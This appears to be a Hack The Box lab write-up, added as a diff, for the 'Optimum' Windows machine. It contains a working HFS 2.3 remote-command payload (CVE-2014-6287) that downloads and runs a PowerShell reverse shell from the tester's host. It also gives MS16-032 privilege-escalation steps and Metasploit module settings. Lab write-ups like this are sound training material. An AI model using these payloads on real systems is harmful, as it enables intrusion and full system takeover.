@@ -1,0 +1,122 @@
+HTB-Optimum-Writeup
+
+ip : 10.10.10.8
+
+Nmap
+----
+- nmap revealed 1 open port
+	80 running http
+- nmap identifies the host as windows
+
+Enumeration
+-----------
+- visiting the website we get HttpFileServer (HFS) with a login form
+- we tried few default credentials but didnt work
+- the bottom of the page leaks the version of the HFS ehich is 2.3
+- we search for any known exploit for HFS 2.3 in searchsploit 
+- we got one Rejetto HttpFileServer 2.3 remote command 
+- this exploit is also known as CVE-2014-6287
+
+Shell as Kostas
+---------------
+- we check and download the exploit from searchsploit 
+
+	searchsploit -x windows/webapps/49125.py
+
+- on viewng the exploit we understood that the below command is used to get RCE
+
+	/?search={.+exec|[url-encoded command].}
+
+- as a POC we can ping ourselves and check the request using tcpdump
+
+	sudo tcpdump -i tun0 icmp and src 10.10.10.8
+
+- visit the below url
+
+	http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+ping+/n+1+10.10.14.54.}
+
+- we can see our box getting pinged in tcpdump
+- now we can include a nashang powershell reverse shell in this and get a shell back
+- choose the Invoke-PowerShellTcpOneLine.ps1 and edit to change the ip and port and lose the comments
+- save it as rev.ps1 to make it easy to pass through URL
+- start a python server 
+- craft a url to download the powershell and run it with powershell
+
+	http://10.10.10.8/?search=%00{.exec|C%3a\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1').}
+
+- setup a netcat listener 
+
+	rlwrap nc -lnvp 443
+
+- we got a shell as kostas
+- grab the user flag
+
+Priv-esc
+--------
+- we can get winpeas on the machine to enumerate for possible priv-esc vectors
+- start an smbserver and host winpeas
+
+	smbserver.py share . -smb2support
+
+- get the file using copy \\10.10.14.54\share\winPEAS.exe .
+- on running winpeas we found that the box is running windows server 2012 R2 and is 64 bit 
+- found credentials for kostas and nothing else
+- we can try enumerating with sherlock to check against CVEs
+- get sherlock onto the machine by hosting it using a python server
+- gettng it with the following command 
+
+	IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.54/Sherlock.ps1') 
+
+- we got 3 hits MS16-032, MS16-034, and MS16-135.
+- download Invoke-MS16032.ps1 script and the below lines at the bottom of it 
+
+	Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.54/rev.ps1')"
+
+- this will download and execute the reverse shell from before (rev.ps1)
+- start a python server and a netcat listener
+- run the below command to get Invoke-MS16032.ps1 on the machine 
+
+	IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.54/Invoke-MS16032.ps1')
+
+- run it and we get a shell as system
+- grab the root flag
+
+With metasploit 
+---------------
+- start msfconsole and search for rejetto, which is the vendor of HFS
+- we got an exploit, use it and set necessary options  
+	
+	use exploit/windows/http/rejetto_hfs_exec
+	set LHOST tun0
+	set LPORT 4444
+	set RHOSTS 10.10.10.8
+	set payload windows/x64/meterpreter/reverse_tcp
+	run
+
+- we got a meterpreter shell
+- use command sysinfo to get information about hostname, os, architecture etc
+- use getuid to check for the user and we can see we are kostas
+
+Priv-esc
+--------
+- background the meterpreter session
+- search for suggester and use local exploit suggester and set options
+
+	use multi/recon/local_exploit_suggester
+	set session 1
+	run
+
+- since its a 64 bit machine its gonna be a little hard for it to find exploit so we didnt get much from that 
+- we search for exploits manually based on the info we got from the sysinfo command we run earlier
+- the box is running windows server 2012 R2 and we found that this box is vulnerable to MS16-032 
+- we search for MS16-032 in metasploit and got one exploit 
+- use it and set necessary options and run
+
+	use exploit/windows/local/ms16-032_secondary_logon_handle_privesc
+	set session 1
+	set LHOST tun0
+	set LPORT 4445
+	run
+
+- we got a shell as system
+- grab the root flag 
